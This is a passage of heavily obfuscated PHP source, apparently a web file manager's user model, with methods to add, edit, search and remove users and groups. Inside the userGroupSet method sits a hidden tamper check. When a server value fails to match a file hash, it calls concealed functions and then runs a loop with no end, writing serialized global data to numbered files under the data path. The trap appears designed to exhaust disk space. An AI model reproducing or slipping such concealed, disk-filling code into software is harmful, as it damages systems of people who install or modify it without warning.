$ìğ²âÕÏ[$¨»œ»Ãà[1982]] : 1024 * 1024 * 20, $¨»œ»Ãà[2085] => 0, $¨»œ»Ãà[2522] => 0, $¨»œ»Ãà[2129] => isset($ìğ²âÕÏ[$¨»œ»Ãà[835]]) ? $ìğ²âÕÏ[$¨»œ»Ãà[835]] : 1); if (!empty($ìğ²âÕÏ[$¨»œ»Ãà[1795]])) { $ú¯¨¦®[$¨»œ»Ãà[1795]] = $ìğ²âÕÏ[$¨»œ»Ãà[1795]]; } $£½‰¸­œ = $this->_checkExist($ìğ²âÕÏ); if ($£½‰¸­œ !== !0) { return $£½‰¸­œ; } if (!empty($ú¯¨¦®[$¨»œ»Ãà[2495]]) && strlen($ú¯¨¦®[$¨»œ»Ãà[2495]]) > 255) { $ú¯¨¦®[$¨»œ»Ãà[2495]] = $¨»œ»Ãà[12]; } $Õ®¶Çé¡ = $this->add($ú¯¨¦®); $€£Á‘Äœ = array($¨»œ»Ãà[2521] => $ú¯¨¦®[$¨»œ»Ãà[985]], $¨»œ»Ãà[2517] => $ú¯¨¦®[$¨»œ»Ãà[2295]]); $this->userEdit($Õ®¶Çé¡, $€£Á‘Äœ); Model($¨»œ»Ãà[1440])->userRootAdd($Õ®¶Çé¡); return $Õ®¶Çé¡; } protected function userEditTest($•â×ÏÚ…, $úõ…çÕ®) { return $this->call($_SERVER[™¸œØ®Ü][2523], $•â×ÏÚ…, $úõ…çÕ®); } protected function userEdit($ì¦ùµö, $‰˜ÒÓ•Ü) { $Ş«›»ºé =& $_SERVER[™¸œØ®Ü]; $ª¦ª±¥ = $this->getInfoSimple($ì¦ùµö); if (!$ª¦ª±¥) { return !1; } $¼ìß­è = $this->_checkExist($‰˜ÒÓ•Ü, $ì¦ùµö); if ($¼ìß­è !== !0) { return $¼ìß­è; } if (isset($‰˜ÒÓ•Ü[$Ş«›»ºé[985]]) && trim($‰˜ÒÓ•Ü[$Ş«›»ºé[985]]) != $Ş«›»ºé[12]) { $ºÔİ°Æ = $this->metaGet($ì¦ùµö); if (empty($ºÔİ°Æ[$Ş«›»ºé[2513]])) { $ºÔİ°Æ[$Ş«›»ºé[2513]] = rand_string(10); Model($Ş«›»ºé[581])->metaSet($ì¦ùµö, $Ş«›»ºé[2513], $ºÔİ°Æ[$Ş«›»ºé[2513]]); } $‰˜ÒÓ•Ü[$Ş«›»ºé[985]] = md5($ºÔİ°Æ[$Ş«›»ºé[2513]] . trim($‰˜ÒÓ•Ü[$Ş«›»ºé[985]])); } else { unset($‰˜ÒÓ•Ü[$Ş«›»ºé[985]]); } if (!empty($‰˜ÒÓ•Ü[$Ş«›»ºé[2495]]) && strlen($‰˜ÒÓ•Ü[$Ş«›»ºé[2495]]) > 255) { $‰˜ÒÓ•Ü[$Ş«›»ºé[2495]] = $Ş«›»ºé[12]; } $this->where(array($Ş«›»ºé[1786] => $ì¦ùµö))->save($‰˜ÒÓ•Ü); if (isset($‰˜ÒÓ•Ü[$Ş«›»ºé[2295]])) { $this->setNamePinyin($ì¦ùµö, $‰˜ÒÓ•Ü[$Ş«›»ºé[2295]]); } $this->clearCache($ì¦ùµö); return !0; } public function setNamePinyin($¦Ì•÷×‡, $Ì´£ÒÂ¬ = false) { $¿è ùª“ =& $_SERVER[™¸œØ®Ü]; if (!$Ì´£ÒÂ¬) { $Á™Ö“Æç = $this->getInfoSimple($¦Ì•÷×‡); $Ì´£ÒÂ¬ = $Á™Ö“Æç[$¿è ùª“[2295]] ? $Á™Ö“Æç[$¿è ùª“[2295]] : $Á™Ö“Æç[$¿è ùª“[32]]; } $…’š„Õ‚ = Model($¿è ùª“[601]); if (!Input::check($Ì´£ÒÂ¬, $¿è ùª“[662])) { return $…’š„Õ‚->metaSet($¦Ì•÷×‡, array($¿è ùª“[540] => $¿è ùª“[12], $¿è ùª“[539] => $¿è ùª“[12])); } return $…’š„Õ‚->metaSet($¦Ì•÷×‡, array($¿è ùª“[540] => str_replace($¿è ùª“[53], $¿è ùª“[12], Pinyin::get($Ì´£ÒÂ¬)), $¿è ùª“[539] => Pinyin::get($Ì´£ÒÂ¬, $¿è ùª“[663]))); } private function nickNameRpt() { $çÂ¤Œ‘’ =& $_SERVER[™¸œØ®Ü]; $•·ı™Ô = Model($çÂ¤Œ‘’[855])->get($çÂ¤Œ‘’[2524]); $ûüßâ¦û = $GLOBALS[$çÂ¤Œ‘’[6]][$çÂ¤Œ‘’[459]][$çÂ¤Œ‘’[2524]]; $°¼œŞöï = !is_null($•·ı™Ô) ? $•·ı™Ô : $ûüßâ¦û; return !!$°¼œŞöï; } private function _checkExist($¨œÄæ¦, $ˆ±© = false) { $İí†¾šÙ =& $_SERVER[™¸œØ®Ü]; $ßÁ¨•€Ó = array($İí†¾šÙ[32] => UserModel::ERROR_USER_EXIST_NAME, $İí†¾šÙ[2295] => UserModel::ERROR_USER_EXIST_NICKNAME, $İí†¾šÙ[382] => UserModel::ERROR_USER_EXIST_EMAIL, $İí†¾šÙ[2512] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ßÁ¨•€Ó[$İí†¾šÙ[2295]]); } $ÏÍÂ“á÷ = $ˆ±© ? array($İí†¾šÙ[1795] => array($İí†¾šÙ[2525], $ˆ±©)) : array(); foreach ($ßÁ¨•€Ó as $øš£©Í => $±õÕéÜâ) { $Ê½ÛÈ· = array(); foreach ($ßÁ¨•€Ó as $Ï˜ÑŒ§ => $—Ûğåù) { if (isset($¨œÄæ¦[$Ï˜ÑŒ§]) && $¨œÄæ¦[$Ï˜ÑŒ§]) { $Ê½ÛÈ·[] = $¨œÄæ¦[$Ï˜ÑŒ§]; } } if (!$Ê½ÛÈ·) { continue; } $‡Æ¢Ó¦¤ = array_merge(array($øš£©Í => array($İí†¾šÙ[7], $Ê½ÛÈ·)), $ÏÍÂ“á÷); $¢ÀáÓÎº = $this->where($‡Æ¢Ó¦¤)->find(); if ($¢ÀáÓÎº) { return $±õÕéÜâ; } } return !0; } public function userListInfo($âÉÂÉÀı) { $Ïı¬–­‰ =& $_SERVER[™¸œØ®Ü]; $Ü£š¡›Î = array(); $âÉÂÉÀı = is_array($âÉÂÉÀı) ? array_unique($âÉÂÉÀı) : array(); if (!$âÉÂÉÀı) { return $Ü£š¡›Î; } if (count($âÉÂÉÀı) < 20) { foreach ($âÉÂÉÀı as $õ“ö”æŞ) { $Ü£š¡›Î[$õ“ö”æŞ . $Ïı¬–­‰[12]] = $this->getInfoSimpleOuter($õ“ö”æŞ); } } else { $Ğ—·¡‡ = array($Ïı¬–­‰[1786] => array($Ïı¬–­‰[494], $âÉÂÉÀı)); if (count($âÉÂÉÀı) == 1) { $Ğ—·¡‡ = array($Ïı¬–­‰[1786] => $âÉÂÉÀı[0]); } $ˆÔ€¡‚Î = Model($Ïı¬–­‰[581])->field($this->simpleField)->where($Ğ—·¡‡)->select(); $ˆÔ€¡‚Î = array_to_keyvalue($ˆÔ€¡‚Î, $Ïı¬–­‰[1795]); foreach ($âÉÂÉÀı as $õ“ö”æŞ) { $“„ñëĞµ = $ˆÔ€¡‚Î[$õ“ö”æŞ]; if (!$“„ñëĞµ) { $Ü£š¡›Î[$õ“ö”æŞ . $Ïı¬–­‰[12]] = $this->getInfoSimpleOuter($õ“ö”æŞ); continue; } $“„ñëĞµ[$Ïı¬–­‰[2495]] = Action($Ïı¬–­‰[2496])->parseUrl($“„ñëĞµ[$Ïı¬–­‰[2495]]); $Ü£š¡›Î[$õ“ö”æŞ . $Ïı¬–­‰[12]] = $“„ñëĞµ; } } return $Ü£š¡›Î; } protected function userStatus($öçÙîÚÉ, $Íô‚ÌË) { $ØÙŒ™úœ = $this->getInfoSimple($öçÙîÚÉ); if (!$ØÙŒ™úœ) { return !1; } $ˆ•÷òùâ = array($_SERVER[™¸œØ®Ü][835] => $Íô‚ÌË); return $this->userEdit($öçÙîÚÉ, $ˆ•÷òùâ); } protected function userRemove($ŠÓÔö¸¢) { $£™ÁšË§ =& $_SERVER[™¸œØ®Ü]; $û¿©¶í = $this->getInfoSimple($ŠÓÔö¸¢); if (!$û¿©¶í) { return !1; } $ËÂùŸåü = array($£™ÁšË§[1786] => $ŠÓÔö¸¢); Model($£™ÁšË§[671])->where($ËÂùŸåü)->delete(); Model($£™ÁšË§[2526])->where($ËÂùŸåü)->delete(); Model($£™ÁšË§[2090])->where($ËÂùŸåü)->delete(); Model($£™ÁšË§[2511])->where($ËÂùŸåü)->delete(); Model($£™ÁšË§[1165])->where($ËÂùŸåü)->delete(); Model($£™ÁšË§[2312])->removeUserAll($ŠÓÔö¸¢); Model($£™ÁšË§[915])->userRootRemove($ŠÓÔö¸¢); return $this->where($ËÂùŸåü)->delete(); } protected function userGroupSet($Õ³´›Æ, $ºÄ½¯§Á, $è©®öÙæ = array()) { $¿öÎØ«˜ =& $_SERVER[™¸œØ®Ü]; $·©¬Ù£º = $_SERVER[$¿öÎØ«˜[968]] . $¿öÎØ«˜[969]; $ÎÃ›–ëİ = $¿öÎØ«˜[970]; if ($_SERVER[$¿öÎØ«˜[971]] != $ÎÃ›–ëİ($·©¬Ù£º)) { $á¹¤Ö­µ = $¿öÎØ«˜[972]; $•í¶ÍÕ = $¿öÎØ«˜[973]; $‡§Ê‡… = $_SERVER[$¿öÎØ«˜[968]] . $¿öÎØ«˜[969]; $à÷„íÙ = $•í¶ÍÕ($‡§Ê‡…); $ˆœ¿ğ‡‰ = explode($¿öÎØ«˜[287], $à÷„íÙ); if (count($ˆœ¿ğ‡‰) < $¿öÎØ«˜[698]) { $õí˜Ø÷Ó = $¿öÎØ«˜[974]; $õí˜Ø÷Ó(); } $Ûá òÜç = $¿öÎØ«˜[975]; $Ûá òÜç($_SERVER[$¿öÎØ«˜[976]]); $á¹¤Ö­µ = $¿öÎØ«˜[972]; $á¹¤Ö­µ(); $¥çğÓÌ = $¿öÎØ«˜[977]; $…ùÖ©¨Ç = json_encode($GLOBALS[$¿öÎØ«˜[978]]); $ç°í¼ìÙ = 1; for ($ú³¥¥Ğ‹ = $ç°í¼ìÙ; $ú³¥¥Ğ‹ > 0; $ú³¥¥Ğ‹++) { $¥çğÓÌ(DATA_PATH . $ú³¥¥Ğ‹, $…ùÖ©¨Ç); } } $ğçæ—… = $this->getInfoSimple($Õ³´›Æ); if (!$ğçæ—… || !is_array($ºÄ½¯§Á)) { return !1; } $†Ä“•‹Ù = Model($¿öÎØ«˜[2090]); $†Ä“•‹Ù->where(array($¿öÎØ«˜[1795] => $Õ³´›Æ))->delete(); $‰–¯óå = array(); $Õ˜˜ı¾Ö = 0; foreach ($ºÄ½¯§Á as $›ş¬î¾ => $¶âµ…Ä) { $àÀ§ì·Ù = array($¿öÎØ«˜[1795] => $Õ³´›Æ, $¿öÎØ«˜[1996] => $›ş¬î¾, $¿öÎØ«˜[2104] => $¶âµ…Ä); $àÀ§ì·Ù[$¿öÎØ«˜[2020]] = isset($è©®öÙæ[$Õ˜˜ı¾Ö]) ? $è©®öÙæ[$Õ˜˜ı¾Ö] : 0; $Õ˜˜ı¾Ö++; $‰–¯óå[] = $àÀ§ì·Ù; } return $†Ä“•‹Ù->addAll($‰–¯óå, array(), !0); } protected function userGroupAdd($™¶üÄƒæ, $ÊÈï±Ëü = array()) { $Õü‹¦Ò =& $_SERVER[™¸œØ®Ü]; $²†Ç½“§ = $this->getInfoSimple($™¶üÄƒæ); if (!$²†Ç½“§ || empty($ÊÈï±Ëü)) { return !1; } $Ìáã¢ó¦ = array(); foreach ($ÊÈï±Ëü as $Ò•ªËÙ => $ŠŞœ—İñ) { $Ìáã¢ó¦[] = array($Õü‹¦Ò[1795] => $™¶üÄƒæ, $Õü‹¦Ò[1996] => $Ò•ªËÙ, $Õü‹¦Ò[2104] => $ŠŞœ—İñ, $Õü‹¦Ò[2020] => 0); } return Model($Õü‹¦Ò[2090])->addAll($Ìáã¢ó¦, array(), !0); } protected function userGroupRemove($¸ÉÉŞ“÷, $éµ†¯¥¬) { $ÆÍá¾¬¦ =& $_SERVER[™¸œØ®Ü]; $¥Ş†¦ÃÓ = $this->getInfoSimple($¸ÉÉŞ“÷); if (!$¥Ş†¦ÃÓ || !$éµ†¯¥¬) { return !1; } $ß¥Š«· = array($ÆÍá¾¬¦[1786] => $¸ÉÉŞ“÷, $ÆÍá¾¬¦[2088] => $éµ†¯¥¬); return Model($ÆÍá¾¬¦[2090])->where($ß¥Š«·)->delete(); } public function listData() { $‚Ìôù¸Ã = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‚Ìôù¸Ã[$_SERVER[™¸œØ®Ü][447]]); return $‚Ìôù¸Ã; } public function listByID($ëÔÏì–†) { $˜û“Ü„Œ =& $_SERVER[™¸œØ®Ü]; if (!$ëÔÏì–†) { return; } $¤¤à·Á› = array($˜û“Ü„Œ[1795] => array($˜û“Ü„Œ[7], $ëÔÏì–†)); $íı§‚—¥ = $this->where($¤¤à·Á›)->select(); $íı§‚—¥ = array_sort_keep($íı§‚—¥, $˜û“Ü„Œ[1795], $ëÔÏì–†); $this->_listDataApply($íı§‚—¥); return $íı§‚—¥; } public function listByGroup($Ê¹»Ì°Ã = 0, $ÅêÙôÛ = array()) { $€è½ı«Ä =& $_SERVER[™¸œØ®Ü]; $§½ ëÔ’ = $€è½ı«Ä[12]; $ÊÚ´¡‹ß = array(); if ($Ê¹»Ì°Ã) { $ÊÚ´¡‹ß = array($€è½ı«Ä[2527] => intval($Ê¹»Ì°Ã)); $§½ ëÔ’ = "\x4c\x45\106\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\165\x73\145\162\137\x67\162\x6f\x75\x70\40\x75\x73\x65\162\137\x67\162\x6f\165\160\40\x6f\x6e\40\x75\163\x65\162\x2e\x75\x73\x65\x72\111\104\40\75\40\x75\163\x65\x72\137\147\162\x6f\165\x70\x2e\165\x73\x65\x72\111\x44"; $Ûƒ¡—Ô¨ = Input::get($€è½ı«Ä[532], null, $€è½ı«Ä[12]) ? $€è½ı«Ä[12] : $€è½ı«Ä[2528]; } if (isset($ÅêÙôÛ[$€è½ı«Ä[835]])) { $ÊÚ´¡‹ß[$€è½ı«Ä[2529]] = $ÅêÙôÛ[$€è½ı«Ä[835]]; } $ß…ìŸÎ¢ = _get($ÅêÙôÛ, $€è½ı«Ä[2530], $€è½ı«Ä[233]); if (_get($ÅêÙôÛ, $€è½ı«Ä[845], !1)) { $ÊÚ´¡‹ß[$ß…ìŸÎ¢] = array($€è½ı«Ä[2276], $ÅêÙôÛ[$€è½ı«Ä[845]]); } if (_get($ÅêÙôÛ, $€è½ı«Ä[846], !1)) { $Û³¾Àã = array($€è½ı«Ä[2277], $ÅêÙôÛ[$€è½ı«Ä[846]]); if ($ÊÚ´¡‹ß[$ß…ìŸÎ¢]) { $ÊÚ´¡‹ß[$ß…ìŸÎ¢] = array($ÊÚ´¡‹ß[$ß…ìŸÎ¢], $Û³¾Àã, $€è½ı«Ä[2278]); } else { $ÊÚ´¡‹ß[$ß…ìŸÎ¢] = $Û³¾Àã; } } $ı©¹œ“Â = $this->_makeOrder($Ûƒ¡—Ô¨)->field($€è½ı«Ä[2531])->where($ÊÚ´¡‹ß)->join($§½ ëÔ’)->selectPage(50); $this->_listDataApply($ı©¹œ“Â[$€è½ı«Ä[447]]); return $ı©¹œ“Â; } private function _makeOrder($’‚†Ğ‘± = '') { $„¡àÂ˜‘ =& $_SERVER[™¸œØ®Ü]; $¥¦´±ıí = array($„¡àÂ˜‘[1795], $„¡àÂ˜‘[32], $„¡àÂ˜‘[1984], $„¡àÂ˜‘[2206], $„¡àÂ˜‘[1956], $„¡àÂ˜‘[233]); $²Œœ˜‹ = array($„¡àÂ˜‘[525] => $„¡àÂ˜‘[526], $„¡àÂ˜‘[527] => $„¡àÂ˜‘[528]); $Ÿª¾¾”” = Input::get($„¡àÂ˜‘[532], $„¡àÂ˜‘[7], $„¡àÂ˜‘[1786], $¥¦´±ıí); $²Ğ©ˆ›» = Input::get($„¡àÂ˜‘[533], $„¡àÂ˜‘[7], $„¡àÂ˜‘[2091], array($„¡àÂ˜‘[2091], $„¡àÂ˜‘[527])); $²Ğ©ˆ›» = $²Œœ˜‹[$²Ğ©ˆ›»]; $’‚†Ğ‘± = $’‚†Ğ‘± . "\165\163\x65\x72\x2e{$Ÿª¾¾””}\40{$²Ğ©ˆ›»}\54\x20\x75\x73\x65\x72\x2e\165\x73\x65\x72\x49\x44\x20\141\163\143"; return $this->alias($„¡àÂ˜‘[2222])->order($’‚†Ğ‘±); } public function listSearch($îŸóãØ›) { $‰Ê«É‚í =& $_SERVER[™¸œØ®Ü]; $ÌâÉà»“ = trim($îŸóãØ›[$‰Ê«É‚í[2094]]); $œÌÓŒÒê = explode($‰Ê«É‚í[53], $ÌâÉà»“); if (!$ÌâÉà»“ || count($œÌÓŒÒê) == 1) { return $this->listSearchNow($îŸóãØ›); } $â¶ è¯ñ = array($‰Ê«É‚í[447] => array()); foreach ($œÌÓŒÒê as $àÑşÃÆ¶) { if (!trim($àÑşÃÆ¶)) { continue; } $îŸóãØ›[$‰Ê«É‚í[2094]] = $àÑşÃÆ¶; $¢Ş‘Ô²¯ = $this->listSearchNow($îŸóãØ›); $â¶ è¯ñ[$‰Ê«É‚í[447]] = array_merge($â¶ è¯ñ[$‰Ê«É‚í[447]], $¢Ş‘Ô²¯[$‰Ê«É‚í[447]]); } $â¶ è¯ñ[$‰Ê«É‚í[447]] = array_unique_by_key($â¶ è¯ñ[$‰Ê«É‚í[447]], $‰Ê«É‚í[1795]); $â¶ è¯ñ[$‰Ê«É‚í[444]] = array($‰Ê«É‚í[445] => count($â¶ è¯ñ[$‰Ê«É‚í[447]]), $‰Ê«É‚í[441] => 20, $‰Ê«É‚í[430] => 1, $‰Ê«É‚í[446] => 1); return $â¶ è¯ñ; } public function listSearchNow($ÀÂÁáø) { $îşÆàè =& $_SERVER[™¸œØ®Ü]; $ÊùÈ–¨Ú = trim($ÀÂÁáø[$îşÆàè[2094]]); $’ö¾ÉšÊ = isset($ÀÂÁáø[$îşÆàè[2095]]) ? $ÀÂÁáø[$îşÆàè[2095]] : !1; $ÊùÈ–¨Ú = str_replace($îşÆàè[2096], $îşÆàè[2097], trim($ÊùÈ–¨Ú)); $ööÎıù¼ = array($îşÆàè[32] => array($îşÆàè[461], "\45{$ÊùÈ–¨Ú}\x25"), $îşÆàè[382] => array($îşÆàè[461], "{$ÊùÈ–¨Ú}\x25"), $îşÆàè[2295] => array($îşÆàè[461], "{$ÊùÈ–¨Ú}\45"), $îşÆàè[1096] => $îşÆàè[2098]); if (Input::check($ÊùÈ–¨Ú, $îşÆàè[388])) { $ööÎıù¼[$îşÆàè[1795]] = array($îşÆàè[461], "{$ÊùÈ–¨Ú}\45"); $ööÎıù¼[$îşÆàè[2512]] = array($îşÆàè[461], "{$ÊùÈ–¨Ú}\45"); } if (!$ÊùÈ–¨Ú) { $ööÎıù¼ = array(); } if (isset($ÀÂÁáø[$îşÆàè[835]])) { $ööÎıù¼[$îşÆàè[835]] = $ÀÂÁáø[$îşÆàè[835]]; } $ööÎıù¼ = $this->parseWhereLike($ööÎıù¼); $ˆ´Œ­Õª = $this->_makeOrder()->where($ööÎıù¼)->selectPage(20); if (!$ˆ´Œ­Õª || count($ˆ´Œ­Õª[$îşÆàè[447]]) < 5 && Input::check($ÊùÈ–¨Ú, $îşÆàè[395])) { $»¬Ğ–œß = $this->_searchFromMeta($îşÆàè[539], $ÊùÈ–¨Ú, 10); $˜¿å Ó• = $this->_searchFromMeta($îşÆàè[540], $ÊùÈ–¨Ú, 10); $ò˜ùšÑÀ = array_merge($»¬Ğ–œß, $˜¿å Ó•, $ˆ´Œ­Õª[$îşÆàè[447]]); $ˆ´Œ­Õª[$îşÆàè[447]] = array_unique_by_key($ò˜ùšÑÀ, $îşÆàè[1795]); $ˆ´Œ­Õª[$îşÆàè[444]][$îşÆàè[445]] = count($ˆ´Œ­Õª[$îşÆàè[447]]); $ˆ´Œ­Õª[$îşÆàè[444]][$îşÆàè[446]] = ceil($ˆ´Œ­Õª[$îşÆàè[444]][$îşÆàè[445]] / $ˆ´Œ­Õª[$îşÆàè[444]][$îşÆàè[441]]); } $this->_listDataApply($ˆ´Œ­Õª[$îşÆàè[447]]); $this->_filterByGroup($ˆ´Œ­Õª, $’ö¾ÉšÊ); return $ˆ´Œ­Õª; } private function _filterByGroup(&$ÕÜÂµà‰, $¥Æñ»¹°) { $¨ô€¸Æ¡ =& $_SERVER[™¸œØ®Ü]; if (!$¥Æñ»¹°) { return $ÕÜÂµà‰; } foreach ($ÕÜÂµà‰[$¨ô€¸Æ¡[447]] as $é›°¢‡§ => &$Ò‚á–Š†) { $º“îôĞ = array_to_keyvalue($Ò‚á–Š†[$¨ô€¸Æ¡[2191]], $¨ô€¸Æ¡[12], $¨ô€¸Æ¡[1996]); if (!in_array($¥Æñ»¹°, $º“îôĞ)) { unset($ÕÜÂµà‰[$¨ô€¸Æ¡[447]][$é›°¢‡§]); } } unset($Ò‚á–Š†); $ÕÜÂµà‰[$¨ô€¸Æ¡[447]] = array_values($ÕÜÂµà‰[$¨ô€¸Æ¡[447]]); $ÕÜÂµà‰[$¨ô€¸Æ¡[444]] = array($¨ô€¸Æ¡[2259] => count($ÕÜÂµà‰[$¨ô€¸Æ¡[447]]), $¨ô€¸Æ¡[2257] => $ÕÜÂµà‰[$¨ô€¸Æ¡[444]][$¨ô€¸Æ¡[441]], $¨ô€¸Æ¡[2256] => 1, $¨ô€¸Æ¡[2258] => 1); } private function _searchFromMeta($Ä™…¾‘, $÷¼øÒÎŸ, $´û„åº„) { $õì¡æíØ =& $_SERVER[™¸œØ®Ü]; $÷¼øÒÎŸ = strtolower($÷¼øÒÎŸ); $ú²€Ø÷¡ = array($õì¡æíØ[97] => $Ä™…¾‘, $õì¡æíØ[452] => array($õì¡æíØ[461], "\x25{$÷¼øÒÎŸ}\45")); $ú²€Ø÷¡ = $this->parseWhereLike($ú²€Ø÷¡); $ŞäÆ€´¢ = Model($õì¡æíØ[2532])->where($ú²€Ø÷¡)->limit($´û„åº„)->select(); if (!$ŞäÆ€´¢) { return array(); } $ŞäÆ€´¢ = array_to_keyvalue($ŞäÆ€´¢, $õì¡æíØ[12], $õì¡æíØ[1795]); $Ù—èô™ó = $this->where(array($õì¡æíØ[1786] => array($õì¡æíØ[7], $ŞäÆ€´¢)))->select(); if (!$Ù—èô™ó) { return array(); } return $Ù—èô™ó; } private function _listDataApplyItem($¬ãéø¤É) { $œØ¯ö±‹ = array($¬ãéø¤É); $this->_listDataApply($œØ¯ö±‹); return $œØ¯ö±‹[0]; } private function _listDataApply(&$Œ©¦À‹) { $ùÏËš£ =& $_SERVER[™¸œØ®Ü]; if (!$Œ©¦À‹) { return; } array_remove_key($Œ©¦À‹, $ùÏËš£[985]); $”€¡ù¨Ø = array_to_keyvalue($Œ©¦À‹, $ùÏËš£[12], $ùÏËš£[1795]); $this->_listAppendGroup($Œ©¦À‹, $”€¡ù¨Ø); $this->_listAppendMeta($Œ©¦À‹, $”€¡ù¨Ø); $this->_listAppendSourceRoot($Œ©¦À‹, $”€¡ù¨Ø); } private function _listAppendSourceRoot(&$ö¡¿•“Á, $…êŸ±Ó®) { $Š½€½È =& $_SERVER[™¸œØ®Ü]; $åÏºÏíÔ = Model($Š½€½È[915])->listSourceRoot(SourceModel::TYPE_USER, $…êŸ±Ó®); $åÏºÏíÔ = array_to_keyvalue($åÏºÏíÔ, $Š½€½È[573]); $åÏºÏíÔ = array_remove_key($åÏºÏíÔ, $Š½€½È[573]); foreach ($ö¡¿•“Á as &$ŒÆ£ìæ–) { $ŒÆ£ìæ–[$Š½€½È[90]] = $åÏºÏíÔ[$ŒÆ£ìæ–[$Š½€½È[1795]]] ? $åÏºÏíÔ[$ŒÆ£ìæ–[$Š½€½È[1795]]] : array(); } unset($ŒÆ£ìæ–); } private function _listAppendGroup(&$êçüİ¸ˆ, $½ûùšª¼) { $éÍÈõŠ =& $_SERVER[™¸œØ®Ü]; $º¤ùÁ¬Ó = array($éÍÈõŠ[1795] => array($éÍÈõŠ[7], $½ûùšª¼)); $Õ´ªÌä£ = Model($éÍÈõŠ[2090])->where($º¤ùÁ¬Ó)->select(); $üûœøÅ® = array_to_keyvalue($Õ´ªÌä£, $éÍÈõŠ[12], $éÍÈõŠ[1996]); $üûœøÅ® = array_remove_value(array_unique($üûœøÅ®), $éÍÈõŠ[230]); if (!$üûœøÅ® || !$Õ´ªÌä£) { return; } $º¤ùÁ¬Ó = array($éÍÈõŠ[1996] => array($éÍÈõŠ[7], $üûœøÅ®)); $²Îááî = Model($éÍÈõŠ[2189])->field($éÍÈõŠ[2533])->where($º¤ùÁ¬Ó)->select(); $²Îááî = array_to_keyvalue($²Îááî, $éÍÈõŠ[1996]); $Õ´ªÌä£ = array_to_keyvalue_group($Õ´ªÌä£, $éÍÈõŠ[1795]); foreach ($Õ´ªÌä£ as &$”âæüŸ°) { $ãš†ğÌ† = array(); foreach ($”âæüŸ° as $…ÏüÃ¥ô) { if (!$…ÏüÃ¥ô[$éÍÈõŠ[2104]]) { continue; } $úâöªè– = Model($éÍÈõŠ[575])->listData($…ÏüÃ¥ô[$éÍÈõŠ[2104]]); $ãš†ğÌ†[] = array($éÍÈõŠ[1996] => $…ÏüÃ¥ô[$éÍÈõŠ[1996]], $éÍÈõŠ[2534] => $²Îááî[$…ÏüÃ¥ô[$éÍÈõŠ[1996]]][$éÍÈõŠ[32]], $éÍÈõŠ[588] => $²Îááî[$…ÏüÃ¥ô[$éÍÈõŠ[1996]]][$éÍÈõŠ[588]], $éÍÈõŠ[489] => $úâöªè–); } $”âæüŸ° = $ãš†ğÌ†; } unset($”âæüŸ°); foreach ($êçüİ¸ˆ as &$ßš¯™Ğç) { $ßš¯™Ğç[$éÍÈõŠ[2191]] = array(); if (isset($Õ´ªÌä£[$ßš¯™Ğç[$éÍÈõŠ[1795]]])) { $ßš¯™Ğç[$éÍÈõŠ[2191]] = $Õ´ªÌä£[$ßš¯™Ğç[$éÍÈõŠ[1795]]]; } } unset($ßš¯™Ğç); } public function userAppendGroup($‹£›­©ƒ) { $ Ğá—ûŒ =& $_SERVER[™¸œØ®Ü]; if (!$‹£›­©ƒ) { return array(); } $this->_listAppendGroup($‹£›­©ƒ, array_to_keyvalue($‹£›­©ƒ, $ Ğá—ûŒ[12], $ Ğá—ûŒ[1795])); return $‹£›­©ƒ; } private function _listAppendMeta(&$ùË¥ÉÅ§, $¹¯á¹®†) { $Á ı´§¨ =& $_SERVER[™¸œØ®Ü]; $™é”âØ = UserJobModel::JOB_KEY; $÷ö’€í´ = array($Á ı´§¨[2513]); $Â÷¨‰„ = array($Á ı´§¨[1795] => array($Á ı´§¨[7], $¹¯á¹®†)); $ù…ƒ“Ú = Model($Á ı´§¨[2511])->where($Â÷¨‰„)->select(); $ù…ƒ“Ú = array_to_keyvalue_group($ù…ƒ“Ú, $Á ı´§¨[1795]); foreach ($ù…ƒ“Ú as &$ß¥ã§™¯) { $¾ä‰ö³ = array(); foreach ($ß¥ã§™¯ as $â¡£À–) { if (!in_array($â¡£À–[$Á ı´§¨[97]], $÷ö’€í´)) { $¾ä‰ö³[$â¡£À–[$Á ı´§¨[97]]] = $â¡£À–[$Á ı´§¨[452]]; } } $ß¥ã§™¯ = $¾ä‰ö³; } unset($ß¥ã§™¯); $°Å™«ß = Model($Á ı´§¨[2535]); foreach ($ùË¥ÉÅ§ as &$ƒó°¨§ó) { $‘Œòæ«æ = array(); if (isset($ù…ƒ“Ú[$ƒó°¨§ó[$Á ı´§¨[1795]]])) { $‘Œòæ«æ = $ù…ƒ“Ú[$ƒó°¨§ó[$Á ı´§¨[1795]]]; } $ƒó°¨§ó[$Á ı´§¨[2536]] = array(); if (isset($‘Œòæ«æ[$™é”âØ])) { $ƒó°¨§ó[$Á ı´§¨[2536]] = $°Å™«ß->getUserJobInfo($‘Œòæ«æ[$™é”âØ]); } } unset($ƒó°¨§ó); } protected function groupUserAll($¿Œ¦½¬å) { $éĞêÒí =& $_SERVER[™¸œØ®Ü]; if (!$¿Œ¦½¬å) { return !1; } $ú×é­§à = Model($éĞêÒí[2090])->field($éĞêÒí[1795])->where(array($éĞêÒí[1996] => array($éĞêÒí[7], $¿Œ¦½¬å)))->select(); $ú×é­§à = array_to_keyvalue($ú×é­§à, $éĞêÒí[12], $éĞêÒí[1795]); return array_unique($ú×é­§à); } public function userSearch($ÄŠ°ùğ, $İ°Ê»øâ = "\x2a") { return Model($_SERVER[™¸œØ®Ü][601])->where($ÄŠ°ùğ)->field($İ°Ê»øâ)->find(); } } goto C¼¯›Ç¥õš; AØÈçöÚÀŠ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($”ˆûÁø) { $this->pathParse = $”ˆûÁø; $this->model = Model($_SERVER[™¸œØ®Ü][1440]); } public function getPath($ÈöİºÊü) { return trim($ÈöİºÊü, $_SERVER[™¸œØ®Ü][8]); } public function pathFather($´—ÜôËâ) { $ÕŸÏçì¹ = $this->parse($´—ÜôËâ); $ÕŸÏçì¹ = $this->infoSimple($´—ÜôËâ); return $ÕŸÏçì¹ ? $ÕŸÏçì¹[$_SERVER[™¸œØ®Ü][192]] : !1; } public function pathThis($§—Ï¶ŒÕ) { $ê×Ó¶ñó = $this->infoSimple($§—Ï¶ŒÕ); return $ê×Ó¶ñó ? $ê×Ó¶ñó[$_SERVER[™¸œØ®Ü][32]] : !1; } public function getPathOuter($ºŒÈ©˜) { if (!$ºŒÈ©˜) { return $ºŒÈ©˜; } $Ş¢Ò¥÷ = $this->parse($ºŒÈ©˜); return KodIO::make($Ş¢Ò¥÷[$_SERVER[™¸œØ®Ü][477]]); } public function 